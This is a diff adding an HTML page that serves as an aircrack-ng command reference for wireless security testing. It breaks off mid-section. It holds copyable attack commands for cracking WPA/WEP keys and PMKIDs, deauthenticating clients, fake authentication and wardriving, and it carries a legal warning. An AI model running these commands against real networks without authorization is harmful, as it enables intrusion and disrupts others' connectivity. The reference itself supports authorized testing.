@@ -1,0 +1,1834 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>aircrack-ng // Command Reference</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --border: #1e2d20;
+    --green: #39ff14;
+    --green2: #1aff7a;
+    --green-dim: #0d4a06;
+    --amber: #ffb800;
+    --red: #ff3b3b;
+    --blue: #00d4ff;
+    --text: #c8d8c0;
+    --text-dim: #4a6045;
+    --mono: 'Share Tech Mono', monospace;
+    --sans: 'Rajdhani', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.07) 2px,
+      rgba(0,0,0,0.07) 4px
+    );
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  /* Header */
+  header {
+    border-bottom: 1px solid var(--border);
+    padding: 24px 32px 20px;
+    background: var(--bg2);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 24px;
+  }
+
+  .logo {
+    font-family: var(--sans);
+    font-size: 26px;
+    font-weight: 700;
+    letter-spacing: 4px;
+    color: var(--green);
+    text-shadow: 0 0 20px rgba(57,255,20,0.4);
+  }
+
+  .logo span { color: var(--text-dim); }
+
+  .tagline {
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .status-bar {
+    display: flex;
+    gap: 16px;
+    align-items: center;
+    font-size: 11px;
+  }
+
+  .status-pill {
+    padding: 3px 10px;
+    border: 1px solid var(--green-dim);
+    color: var(--green);
+    letter-spacing: 1px;
+    font-size: 10px;
+  }
+
+  .search-wrap {
+    position: relative;
+    flex: 0 0 260px;
+  }
+
+  .search-wrap input {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--green);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 7px 12px 7px 32px;
+    outline: none;
+    letter-spacing: 1px;
+    transition: border-color .2s;
+  }
+
+  .search-wrap input:focus { border-color: var(--green-dim); }
+  .search-wrap input::placeholder { color: var(--text-dim); }
+
+  .search-wrap::before {
+    content: '⌕';
+    position: absolute;
+    left: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--text-dim);
+    font-size: 16px;
+  }
+
+  /* Layout */
+  .container {
+    display: grid;
+    grid-template-columns: 220px 1fr;
+    min-height: calc(100vh - 73px);
+  }
+
+  /* Sidebar */
+  nav {
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    padding: 20px 0;
+    position: sticky;
+    top: 73px;
+    height: calc(100vh - 73px);
+    overflow-y: auto;
+  }
+
+  nav::-webkit-scrollbar { width: 3px; }
+  nav::-webkit-scrollbar-track { background: var(--bg2); }
+  nav::-webkit-scrollbar-thumb { background: var(--green-dim); }
+
+  .nav-section {
+    margin-bottom: 4px;
+  }
+
+  .nav-header {
+    font-family: var(--sans);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    padding: 10px 20px 6px;
+    text-transform: uppercase;
+  }
+
+  .nav-link {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 20px;
+    color: var(--text);
+    text-decoration: none;
+    font-size: 12px;
+    letter-spacing: 1px;
+    cursor: pointer;
+    border-left: 2px solid transparent;
+    transition: all .15s;
+  }
+
+  .nav-link:hover, .nav-link.active {
+    color: var(--green);
+    border-left-color: var(--green);
+    background: rgba(57,255,20,0.04);
+  }
+
+  .nav-dot {
+    width: 5px; height: 5px;
+    background: var(--text-dim);
+    border-radius: 50%;
+    flex-shrink: 0;
+    transition: background .15s;
+  }
+
+  .nav-link:hover .nav-dot,
+  .nav-link.active .nav-dot { background: var(--green); }
+
+  /* Main content */
+  main {
+    padding: 32px 40px;
+    overflow-y: auto;
+  }
+
+  .section {
+    display: none;
+    animation: fadeIn .2s ease;
+  }
+
+  .section.active { display: block; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(6px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Section title */
+  .section-title {
+    font-family: var(--sans);
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--green);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+    text-shadow: 0 0 30px rgba(57,255,20,0.25);
+  }
+
+  .section-sub {
+    color: var(--text-dim);
+    font-size: 11px;
+    letter-spacing: 2px;
+    margin-bottom: 28px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  /* Command card */
+  .cmd-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    margin-bottom: 16px;
+    overflow: hidden;
+    transition: border-color .2s;
+  }
+
+  .cmd-card:hover { border-color: var(--green-dim); }
+
+  .cmd-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 18px;
+    cursor: pointer;
+    user-select: none;
+    background: var(--bg3);
+    gap: 12px;
+  }
+
+  .cmd-header:hover { background: rgba(57,255,20,0.03); }
+
+  .cmd-name {
+    font-family: var(--sans);
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--green);
+    letter-spacing: 2px;
+    flex-shrink: 0;
+  }
+
+  .cmd-brief {
+    color: var(--text-dim);
+    font-size: 11px;
+    letter-spacing: 1px;
+    flex: 1;
+  }
+
+  .cmd-toggle {
+    color: var(--text-dim);
+    font-size: 18px;
+    line-height: 1;
+    transition: transform .2s, color .2s;
+    flex-shrink: 0;
+  }
+
+  .cmd-card.open .cmd-toggle {
+    transform: rotate(45deg);
+    color: var(--green);
+  }
+
+  .cmd-body {
+    display: none;
+    padding: 18px 18px 20px;
+    border-top: 1px solid var(--border);
+  }
+
+  .cmd-card.open .cmd-body { display: block; }
+
+  .cmd-desc {
+    color: var(--text);
+    margin-bottom: 16px;
+    line-height: 1.8;
+    font-size: 12px;
+  }
+
+  /* Code block */
+  .code-block {
+    background: #050708;
+    border: 1px solid #1a2a1a;
+    border-left: 3px solid var(--green-dim);
+    padding: 12px 16px;
+    margin: 10px 0;
+    position: relative;
+    overflow-x: auto;
+  }
+
+  .code-block code {
+    color: var(--green2);
+    font-size: 12px;
+    white-space: pre;
+    display: block;
+  }
+
+  .code-block .comment {
+    color: var(--text-dim);
+  }
+
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: var(--green-dim);
+    border: none;
+    color: var(--green);
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 3px 8px;
+    cursor: pointer;
+    letter-spacing: 1px;
+    opacity: 0;
+    transition: opacity .2s;
+  }
+
+  .code-block:hover .copy-btn { opacity: 1; }
+  .copy-btn:hover { background: rgba(57,255,20,0.2); }
+
+  /* Flag table */
+  .flag-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 12px;
+    font-size: 12px;
+  }
+
+  .flag-table th {
+    text-align: left;
+    padding: 8px 12px;
+    color: var(--text-dim);
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--sans);
+    font-weight: 700;
+  }
+
+  .flag-table td {
+    padding: 8px 12px;
+    border-bottom: 1px solid rgba(30,45,32,0.5);
+    vertical-align: top;
+  }
+
+  .flag-table tr:last-child td { border-bottom: none; }
+  .flag-table tr:hover td { background: rgba(57,255,20,0.02); }
+
+  .flag {
+    color: var(--amber);
+    white-space: nowrap;
+    font-size: 12px;
+  }
+
+  .flag-desc { color: var(--text); }
+
+  /* Labels */
+  .label {
+    display: inline-block;
+    padding: 2px 7px;
+    font-size: 9px;
+    letter-spacing: 1px;
+    font-family: var(--sans);
+    font-weight: 700;
+    text-transform: uppercase;
+    margin-right: 6px;
+    margin-bottom: 2px;
+  }
+
+  .label-green { background: rgba(57,255,20,0.1); color: var(--green); border: 1px solid var(--green-dim); }
+  .label-amber { background: rgba(255,184,0,0.1); color: var(--amber); border: 1px solid rgba(255,184,0,0.3); }
+  .label-red { background: rgba(255,59,59,0.1); color: var(--red); border: 1px solid rgba(255,59,59,0.3); }
+  .label-blue { background: rgba(0,212,255,0.1); color: var(--blue); border: 1px solid rgba(0,212,255,0.3); }
+
+  /* Tip boxes */
+  .tip-box {
+    border: 1px solid;
+    padding: 12px 16px;
+    margin: 12px 0;
+    font-size: 12px;
+    line-height: 1.7;
+  }
+
+  .tip-box.warn {
+    border-color: rgba(255,184,0,0.3);
+    background: rgba(255,184,0,0.04);
+    color: var(--amber);
+  }
+
+  .tip-box.info {
+    border-color: rgba(0,212,255,0.2);
+    background: rgba(0,212,255,0.03);
+    color: var(--blue);
+  }
+
+  .tip-box.danger {
+    border-color: rgba(255,59,59,0.3);
+    background: rgba(255,59,59,0.04);
+    color: var(--red);
+  }
+
+  .tip-box strong {
+    display: block;
+    font-family: var(--sans);
+    font-weight: 700;
+    letter-spacing: 2px;
+    font-size: 10px;
+    margin-bottom: 4px;
+    text-transform: uppercase;
+  }
+
+  /* Subheading */
+  h4 {
+    font-family: var(--sans);
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin: 18px 0 8px;
+  }
+
+  /* Troubleshoot items */
+  .trouble-item {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    margin-bottom: 14px;
+    overflow: hidden;
+  }
+
+  .trouble-q {
+    padding: 12px 16px;
+    color: var(--amber);
+    font-family: var(--sans);
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    cursor: pointer;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: var(--bg3);
+  }
+
+  .trouble-q:hover { background: rgba(255,184,0,0.04); }
+
+  .trouble-toggle { font-size: 16px; transition: transform .2s; }
+  .trouble-item.open .trouble-toggle { transform: rotate(45deg); }
+
+  .trouble-a {
+    display: none;
+    padding: 14px 16px;
+    border-top: 1px solid var(--border);
+    color: var(--text);
+    font-size: 12px;
+    line-height: 1.8;
+  }
+
+  .trouble-item.open .trouble-a { display: block; }
+
+  /* Step list */
+  .steps {
+    counter-reset: step;
+    list-style: none;
+    margin: 10px 0;
+  }
+
+  .steps li {
+    counter-increment: step;
+    padding: 6px 0 6px 28px;
+    position: relative;
+    color: var(--text);
+    font-size: 12px;
+  }
+
+  .steps li::before {
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 6px;
+    width: 18px;
+    height: 18px;
+    background: var(--green-dim);
+    color: var(--green);
+    font-size: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--sans);
+    font-weight: 700;
+  }
+
+  /* Home hero */
+  .hero {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 32px;
+    margin-bottom: 28px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: 'AIRCRACK-NG';
+    position: absolute;
+    right: -20px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-family: var(--sans);
+    font-size: 100px;
+    font-weight: 700;
+    color: rgba(57,255,20,0.03);
+    letter-spacing: 10px;
+    white-space: nowrap;
+    pointer-events: none;
+  }
+
+  .hero-title {
+    font-family: var(--sans);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 4px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+
+  .hero-desc {
+    color: var(--text);
+    font-size: 12px;
+    line-height: 1.9;
+    max-width: 600px;
+    margin-bottom: 20px;
+  }
+
+  .tool-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 10px;
+    margin-top: 20px;
+  }
+
+  .tool-tile {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 12px 14px;
+    cursor: pointer;
+    transition: all .15s;
+    text-decoration: none;
+  }
+
+  .tool-tile:hover {
+    border-color: var(--green-dim);
+    background: rgba(57,255,20,0.04);
+  }
+
+  .tool-tile-name {
+    font-family: var(--sans);
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--green);
+    letter-spacing: 2px;
+    margin-bottom: 4px;
+  }
+
+  .tool-tile-desc {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 0.5px;
+    line-height: 1.5;
+  }
+
+  /* Highlight */
+  .highlight { color: var(--green); }
+
+  /* Scrollbar main */
+  main::-webkit-scrollbar { width: 3px; }
+  main::-webkit-scrollbar-track { background: var(--bg); }
+  main::-webkit-scrollbar-thumb { background: var(--green-dim); }
+
+  /* Search highlight */
+  .search-match { background: rgba(57,255,20,0.15); color: var(--green); }
+
+  /* Responsive */
+  @media (max-width: 720px) {
+    .container { grid-template-columns: 1fr; }
+    nav { display: none; }
+    header { flex-wrap: wrap; }
+    main { padding: 20px; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div>
+    <div class="logo">AIRCRACK<span>-</span>NG</div>
+    <div class="tagline">Complete Wireless Security Reference</div>
+  </div>
+  <div class="search-wrap">
+    <input type="text" id="search" placeholder="Search commands..." autocomplete="off">
+  </div>
+  <div class="status-bar">
+    <span class="status-pill">v1.7</span>
+    <span class="status-pill">802.11 WEP/WPA</span>
+  </div>
+</header>
+
+<div class="container">
+  <nav>
+    <div class="nav-section">
+      <div class="nav-header">Overview</div>
+      <a class="nav-link active" onclick="showSection('home')"><span class="nav-dot"></span>Home</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-header">Tools</div>
+      <a class="nav-link" onclick="showSection('aircrack')"><span class="nav-dot"></span>aircrack-ng</a>
+      <a class="nav-link" onclick="showSection('airodump')"><span class="nav-dot"></span>airodump-ng</a>
+      <a class="nav-link" onclick="showSection('aireplay')"><span class="nav-dot"></span>aireplay-ng</a>
+      <a class="nav-link" onclick="showSection('airmon')"><span class="nav-dot"></span>airmon-ng</a>
+      <a class="nav-link" onclick="showSection('airdecap')"><span class="nav-dot"></span>airdecap-ng</a>
+      <a class="nav-link" onclick="showSection('airtun')"><span class="nav-dot"></span>airtun-ng</a>
+      <a class="nav-link" onclick="showSection('packetforge')"><span class="nav-dot"></span>packetforge-ng</a>
+      <a class="nav-link" onclick="showSection('airbase')"><span class="nav-dot"></span>airbase-ng</a>
+      <a class="nav-link" onclick="showSection('airdecloak')"><span class="nav-dot"></span>airdecloak-ng</a>
+      <a class="nav-link" onclick="showSection('wesside')"><span class="nav-dot"></span>wesside-ng</a>
+      <a class="nav-link" onclick="showSection('easside')"><span class="nav-dot"></span>easside-ng</a>
+      <a class="nav-link" onclick="showSection('buddy')"><span class="nav-dot"></span>buddy-ng</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-header">Support</div>
+      <a class="nav-link" onclick="showSection('troubleshoot')"><span class="nav-dot"></span>Troubleshooting</a>
+      <a class="nav-link" onclick="showSection('workflows')"><span class="nav-dot"></span>Workflows</a>
+    </div>
+  </nav>
+
+  <main id="main-content">
+
+    <!-- HOME -->
+    <div class="section active" id="section-home">
+      <div class="section-title">Reference</div>
+      <div class="section-sub">COMPLETE AIRCRACK-NG COMMAND REFERENCE // CLICK A TOOL BELOW</div>
+
+      <div class="hero">
+        <div class="hero-title">About aircrack-ng</div>
+        <div class="hero-desc">
+          Aircrack-ng is a complete 802.11 WEP and WPA/WPA2-PSK key cracking suite. Tools cover packet capture, replay attacks, authentication cracking, and analysis. Requires monitor-mode capable adapter and root/admin privileges.
+        </div>
+        <div class="tip-box danger">
+          <strong>⚠ Legal Warning</strong>
+          Use only on networks you own or have written authorization to test. Unauthorized access is illegal.
+        </div>
+      </div>
+
+      <h4>Jump to Tool</h4>
+      <div class="tool-grid">
+        <div class="tool-tile" onclick="showSection('aircrack')">
+          <div class="tool-tile-name">aircrack-ng</div>
+          <div class="tool-tile-desc">Key cracking engine</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('airodump')">
+          <div class="tool-tile-name">airodump-ng</div>
+          <div class="tool-tile-desc">Packet capture & AP scanning</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('aireplay')">
+          <div class="tool-tile-name">aireplay-ng</div>
+          <div class="tool-tile-desc">Frame injection & attacks</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('airmon')">
+          <div class="tool-tile-name">airmon-ng</div>
+          <div class="tool-tile-desc">Monitor mode management</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('airdecap')">
+          <div class="tool-tile-name">airdecap-ng</div>
+          <div class="tool-tile-desc">Decrypt captured packets</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('airtun')">
+          <div class="tool-tile-name">airtun-ng</div>
+          <div class="tool-tile-desc">Virtual tunnel interface</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('packetforge')">
+          <div class="tool-tile-name">packetforge</div>
+          <div class="tool-tile-desc">Forge encrypted packets</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('airbase')">
+          <div class="tool-tile-name">airbase-ng</div>
+          <div class="tool-tile-desc">Fake AP / client attacks</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('troubleshoot')">
+          <div class="tool-tile-name">Troubleshoot</div>
+          <div class="tool-tile-desc">Fix common issues</div>
+        </div>
+        <div class="tool-tile" onclick="showSection('workflows')">
+          <div class="tool-tile-name">Workflows</div>
+          <div class="tool-tile-desc">End-to-end examples</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- AIRCRACK-NG -->
+    <div class="section" id="section-aircrack">
+      <div class="section-title">aircrack-ng</div>
+      <div class="section-sub">WEP KEY CRACKING + WPA/WPA2 PASSPHRASE RECOVERY</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">WPA Crack — Dictionary</span>
+          <span class="cmd-brief">Crack WPA/WPA2 handshake with wordlist</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Runs dictionary attack against a captured 4-way handshake. Capture file must contain at least one complete handshake.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Basic dictionary attack</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap
+
+<span class="comment"># Specify ESSID instead of BSSID</span>
+aircrack-ng -w wordlist.txt -e "NetworkName" capture.cap
+
+<span class="comment"># Multiple wordlists</span>
+aircrack-ng -w list1.txt,list2.txt,list3.txt capture.cap</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-w &lt;file&gt;</td><td class="flag-desc">Wordlist file path (comma-separated for multiple)</td></tr>
+            <tr><td class="flag">-b &lt;bssid&gt;</td><td class="flag-desc">Target AP MAC address (filter multiple networks)</td></tr>
+            <tr><td class="flag">-e &lt;essid&gt;</td><td class="flag-desc">Target AP SSID name</td></tr>
+            <tr><td class="flag">-l &lt;file&gt;</td><td class="flag-desc">Write cracked key to file</td></tr>
+            <tr><td class="flag">-q</td><td class="flag-desc">Quiet — suppress output</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">WEP Crack</span>
+          <span class="cmd-brief">Statistical attack on WEP encrypted captures</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Cracks WEP keys using statistical analysis. Needs ~5,000-40,000 IVs minimum. More IVs = faster crack.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Auto detect key length</span>
+aircrack-ng capture.cap
+
+<span class="comment"># Force 128-bit key</span>
+aircrack-ng -n 128 capture.cap
+
+<span class="comment"># Multiple capture files merged</span>
+aircrack-ng -b AA:BB:CC:DD:EE:FF *.cap</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-n &lt;bits&gt;</td><td class="flag-desc">WEP key length: 64, 128, 152, 256, 512</td></tr>
+            <tr><td class="flag">-i &lt;index&gt;</td><td class="flag-desc">WEP key index (0-3), default 0</td></tr>
+            <tr><td class="flag">-f &lt;fudge&gt;</td><td class="flag-desc">Fudge factor (higher = slower but more exhaustive)</td></tr>
+            <tr><td class="flag">-k &lt;korek&gt;</td><td class="flag-desc">Disable specific KoreK attack (1-17)</td></tr>
+            <tr><td class="flag">-m &lt;maddr&gt;</td><td class="flag-desc">MAC of client for WEP PRGA</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">PMKID Attack</span>
+          <span class="cmd-brief">Crack WPA without full handshake</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Uses PMKID hash extracted from a single EAPOL frame. No need for a connected client. Use hcxdumptool to capture PMKID first.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Convert hcxpcapng to hashcat format first</span>
+hcxpcapngtool -o hash.hc22000 capture.pcapng
+
+<span class="comment"># Then crack with hashcat (mode 22000)</span>
+hashcat -m 22000 hash.hc22000 wordlist.txt
+
+<span class="comment"># Or with aircrack-ng on PMKID cap</span>
+aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF pmkid.cap</code>
+          </div>
+          <div class="tip-box info">
+            <strong>ℹ Info</strong>
+            PMKID is embedded in RSN IE. Available on most modern routers using WPA2.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- AIRODUMP-NG -->
+    <div class="section" id="section-airodump">
+      <div class="section-title">airodump-ng</div>
+      <div class="section-sub">PACKET CAPTURE // AP & CLIENT DISCOVERY</div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Scan All Networks</span>
+          <span class="cmd-brief">Discover all visible access points and clients</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Scans all channels and shows every AP and associated client visible to the adapter.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Basic scan</span>
+airodump-ng wlan0mon
+
+<span class="comment"># Scan 5GHz band</span>
+airodump-ng --band a wlan0mon
+
+<span class="comment"># Scan both 2.4GHz and 5GHz</span>
+airodump-ng --band abg wlan0mon</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Targeted Capture</span>
+          <span class="cmd-brief">Lock to specific AP and save capture file</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Locks adapter to the target AP's channel and saves all frames to a capture file. Essential before running attacks.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Capture specific AP to file</span>
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+<span class="comment"># Also capture specific client</span>
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --essid "WIFI_NAME" -w capture wlan0mon
+
+<span class="comment"># Output in multiple formats</span>
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap,csv,kismet wlan0mon</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-c &lt;channel&gt;</td><td class="flag-desc">Lock to specific channel (1-14 for 2.4GHz)</td></tr>
+            <tr><td class="flag">--bssid</td><td class="flag-desc">Filter by AP MAC address</td></tr>
+            <tr><td class="flag">--essid</td><td class="flag-desc">Filter by AP name</td></tr>
+            <tr><td class="flag">-w &lt;prefix&gt;</td><td class="flag-desc">Write capture to file (prefix.cap, prefix.csv etc)</td></tr>
+            <tr><td class="flag">--output-format</td><td class="flag-desc">pcap, ivs, csv, gps, kismet, netxml, logcsv</td></tr>
+            <tr><td class="flag">-I &lt;seconds&gt;</td><td class="flag-desc">Update interval (default 1 second)</td></tr>
+            <tr><td class="flag">--uptime</td><td class="flag-desc">Display AP uptime in output</td></tr>
+            <tr><td class="flag">--wps</td><td class="flag-desc">Display WPS information</td></tr>
+            <tr><td class="flag">--berlin &lt;sec&gt;</td><td class="flag-desc">Time before AP/client removed from list</td></tr>
+          </table>
+          <div class="tip-box info">
+            <strong>ℹ Output Files Generated</strong>
+            -w capture creates: capture-01.cap (packets), capture-01.csv (network list), capture-01.kismet.csv, capture-01.kismet.netxml
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">GPS Integration</span>
+          <span class="cmd-brief">Tag captures with location data</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Requires gpsd running. Tags each captured packet with GPS coordinates for wardriving.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Start gpsd first</span>
+gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock
+
+<span class="comment"># Capture with GPS tagging</span>
+airodump-ng --gpsd -w wardrive --output-format pcap,gps,kismet wlan0mon</code>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- AIREPLAY-NG -->
+    <div class="section" id="section-aireplay">
+      <div class="section-title">aireplay-ng</div>
+      <div class="section-sub">FRAME INJECTION // REPLAY ATTACKS // DEAUTH</div>
+
+      <div class="tip-box warn">
+        <strong>⚠ Prerequisites</strong>
+        Adapter must support injection. Test with: <code>aireplay-ng --test wlan0mon</code>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Attack 0 — Deauthentication</span>
+          <span class="cmd-brief">Force clients to reconnect (capture handshake)</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Sends deauth frames to disconnect clients. Used to force a WPA handshake on reconnection. Works on WEP/WPA/WPA2.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Deauth all clients from AP (10 deauth frames)</span>
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span class="comment"># Deauth specific client</span>
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+<span class="comment"># Continuous deauth (0 = infinite — use carefully)</span>
+aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-0 &lt;count&gt;</td><td class="flag-desc">Number of deauths to send (0 = infinite)</td></tr>
+            <tr><td class="flag">-a &lt;bssid&gt;</td><td class="flag-desc">Target AP MAC</td></tr>
+            <tr><td class="flag">-c &lt;client&gt;</td><td class="flag-desc">Specific client MAC (omit for broadcast)</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Attack 1 — Fake Authentication</span>
+          <span class="cmd-brief">Associate with target AP without credentials</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Associates with AP for WEP attacks. Required before ARP replay. Two modes: Open System (OPN) and Shared Key (SKA).</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment"># Single fake auth</span>
+aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span class="comment"># Persistent fake auth (re-associate every 30s)</span>
+aireplay-ng -1 30 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span class="comment"># Fake auth with custom client MAC</span>
+aireplay-ng -1 0 -e "SSID" -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon</code>
+          </div>
+          <table class="flag-table">
+            <tr><th>Flag</th><th>Description</th></tr>
+            <tr><td class="flag">-1 &lt;delay&gt;</td><td class="flag-desc">Re-assoc delay in seconds</td></tr>
+            <tr><td class="flag">-e &lt;essid&gt;</td><td class="flag-desc">Target AP SSID</td></tr>
+            <tr><td class="flag">-a &lt;bssid&gt;</td><td class="flag-desc">Target AP MAC</td></tr>
+            <tr><td class="flag">-h &lt;mac&gt;</td><td class="flag-desc">Source MAC address to use</td></tr>
+            <tr><td class="flag">-T &lt;tries&gt;</td><td class="flag-desc">Number of attempts before giving up</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Attack 3 — ARP Replay</span>
+          <span class="cmd-brief">Generate IVs by replaying ARP requests</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">Waits for ARP packet, then replays it to generate new IVs. Most effective WEP attack — generates thousands of IVs/second.</div>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
